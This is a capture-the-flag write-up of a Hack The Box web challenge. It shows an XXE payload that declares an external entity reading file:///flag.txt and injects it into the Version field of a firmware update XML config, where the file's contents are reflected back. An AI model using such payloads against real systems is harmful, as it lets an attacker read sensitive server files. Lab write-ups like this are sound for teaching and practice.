This HTB challenge was a website with a page containing a configuration file for firmware updates as can be seen below.
This was the most promising entry point through
- Command Injection
- Reverse Shell Spawning, and
- XXE
  
Since there is no logic to execute commands, command injection and reverse shell does not work. 
The trick, the trick therefore is to use XXE and return the file information in the Version parameter since it is the only one that is reflected back to the user.
The payload is below

```
<!--?xml version="1.0" ?-->
<!DOCTYPE FirmwareUpdateConfig [<!ENTITY xxe SYSTEM "file:///flag.txt"> ]>
```
Add the above to the existing configuration file and change only the  Version parameter
```
<FirmwareUpdateConfig>
    <Firmware>
        <Version>&xxe;</Version> # This is the injection point
        <ReleaseDate>2077-10-21</ReleaseDate>
        <Description>Update includes advanced biometric lock functionality for enhanced security.</Description>
        <Checksum type="SHA-256">9b74c9897bac770ffc029102a200c5de</Checksum>
    </Firmware>
    <Components>
        <Component name="navigation">
            <Version>3.7.2</Version>
            <Description>Updated GPS algorithms for improved wasteland navigation.</Description>
            <Checksum type="SHA-256">e4d909c290d0fb1ca068ffaddf22cbd0</Checksum>
        </Component>
        <Component name="communication">
            <Version>4.5.1</Version>
            <Description>Enhanced encryption for secure communication channels.</Description>
            <Checksum type="SHA-256">88d862aeb067278155c67a6d6c0f3729</Checksum>
        </Component>
        <Component name="biometric_security">
            <Version>2.0.5</Version>
            <Description>Introduces facial recognition and fingerprint scanning for access control.</Description>
            <Checksum type="SHA-256">abcdef1234567890abcdef1234567890</Checksum>
        </Component>
    </Components>
    <UpdateURL>https://satellite-updates.hackthebox.org/firmware/1.33.7/download</UpdateURL>
</FirmwareUpdateConfig>
```

